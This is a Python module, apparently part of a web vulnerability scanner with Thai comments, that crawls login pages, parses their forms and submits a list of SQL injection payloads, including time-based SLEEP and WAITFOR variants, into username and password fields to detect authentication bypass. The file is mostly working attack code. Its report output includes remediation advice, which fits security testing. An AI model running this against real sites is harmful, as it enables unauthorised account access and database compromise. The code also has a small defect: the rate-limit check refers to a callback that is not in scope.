import aiohttp
import asyncio
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Payloads สำหรับ Bypass Login (SQLi / NoSQLi / Logic)
BYPASS_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "admin' #",
    "' OR TRUE --",
    '" OR ""=""',
    "admin'/*",
    "' OR '1'='1' --",
    "' OR 1=1 LIMIT 1 --",
    "' OR 'a'='a",
    # NoSQL Injection (MongoDB/Node.js)
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": "a.*"}',
    # Advanced / Time-Based (Check for delay if possible, here mainly for error/bypass)
    "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "'; WAITFOR DELAY '0:0:5'--"
]

# คำที่บ่งบอกว่า Login สำเร็จ
SUCCESS_KEYWORDS = [
    "dashboard", "welcome", "logout", "profile", "account", "settings", "admin panel"
]

async def try_bypass(session, url, form_details):
    action = form_details.get("action")
    method = form_details.get("method", "post").lower()
    inputs = form_details.get("inputs", [])
    
    target_url = urljoin(url, action)
    
    # Initial check to see baseline response (to compare logic)
    baseline_status = 0
    baseline_len = 0
    try:
        async with session.post(target_url, data={"u": "invalid_user_checks", "p": "invalid_pass_checks"}, timeout=5, ssl=False) as base_resp:
            baseline_status = base_resp.status
            baseline_len = len(await base_resp.text())
    except: pass

    for payload in BYPASS_PAYLOADS:
        data = {}
        # Payload injection
        for inp in inputs:
            name = inp.get("name")
            if not name: continue
            name_lower = name.lower()
            if "user" in name_lower or "email" in name_lower or "login" in name_lower:
                data[name] = payload 
            elif "pass" in name_lower:
                data[name] = payload 
            else:
                data[name] = "test" 
        
        if not data: continue 

        try:
            if "{" in payload: # Skip NoSQL
                continue

            start_time = asyncio.get_event_loop().time()
            async with session.post(target_url, data=data, timeout=10, ssl=False, allow_redirects=True) as resp:
                # [ADVANCED] Rate Limit Check
                if resp.status == 429:
                    if log_callback: log_callback(f"⚠️ Rate Limit detected at {url}. Aborting Auth Bypass.")
                    return None

                text = (await resp.text()).lower()
                final_url = str(resp.url)
                duration = asyncio.get_event_loop().time() - start_time
                
                # Logic Detection
                is_success = False
                
                # 1. Status Code Change (e.g., 403 -> 200, or 401 -> 302)
                if baseline_status != 0 and resp.status != baseline_status:
                    # Ignore 500/400 errors as success (unless specific error based)
                    if resp.status < 400 or resp.status == 302:
                         # Likely interesting
                         pass

                # 2. Redirects
                if any(kw in final_url for kw in ["dashboard", "admin", "home", "account"]) and url != final_url:
                    is_success = True
                
                # 3. Content Analysis
                elif any(kw in text for kw in SUCCESS_KEYWORDS):
                    if "invalid" not in text and "incorrect" not in text and "fail" not in text:
                        is_success = True
                
                # 4. Response Length Anomaly (Simple)
                if abs(len(text) - baseline_len) > 500 and baseline_len > 0:
                     # Significant change
                     # Maybe verify further
                     pass

                # 5. Time-Based Detection (If payload was time-based)
                if "SLEEP" in payload or "WAITFOR" in payload:
                    if duration > 4.5:
                        return {
                            "type": "Blind SQL Injection (Time-Based)",
                            "severity": "Critical",
                            "detail": f"Time-based delay of {duration:.2f}s detected.",
                            "evidence": f"Payload: {payload}\nTarget: {target_url}",
                            "remediation": "Use parameterized queries."
                        }

                if is_success:
                    return {
                        "type": "Authentication Bypass (Logic/SQLi)",
                        "severity": "Critical",
                        "detail": f"Successfully bypassed login at {url}",
                        "evidence": f"Payload: {payload}\nTarget Form: {target_url}\nRedirected to: {final_url}",
                        "remediation": "Sanitize all login inputs and use parameterized queries."
                    }
        except Exception as e: 
            pass
        
    return None

async def run_auth_bypass(target_url, crawled_urls, log_callback=None, headers=None):
    findings = []
    # กรองหาเฉพาะหน้า Login
    login_urls = [u for u in crawled_urls if "login" in u.lower() or "signin" in u.lower() or "admin" in u.lower()]
    
    if not login_urls: return findings
    
    # ลิมิตไว้สัก 5 หน้า login แรกก็พอ
    target_logins = login_urls[:5]
    
    if log_callback: log_callback(f"🔓 Attempting Auth Bypass on {len(target_logins)} login portals...")
    
    async with aiohttp.ClientSession(headers=headers) as session:
        for url in target_logins:
            try:
                async with session.get(url, timeout=5, ssl=False) as resp:
                    html = await resp.text()
                    soup = BeautifulSoup(html, "html.parser")
                    forms = soup.find_all("form")
                    
                    for form in forms:
                        details = {
                            "action": form.attrs.get("action", ""),
                            "method": form.attrs.get("method", "get").lower(),
                            "inputs": []
                        }
                        for input_tag in form.find_all("input"):
                            details["inputs"].append({
                                "name": input_tag.attrs.get("name"),
                                "type": input_tag.attrs.get("type", "text")
                            })
                        
                        # เริ่มยิง
                        result = await try_bypass(session, url, details)
                        if result:
                            findings.append(result)
                            if log_callback: log_callback(f"🔥 AUTH BYPASSED: {url}")
                            return findings # เจอ 1 ที่ก็ถือว่า Critical แล้ว
            except: pass
            
    return findings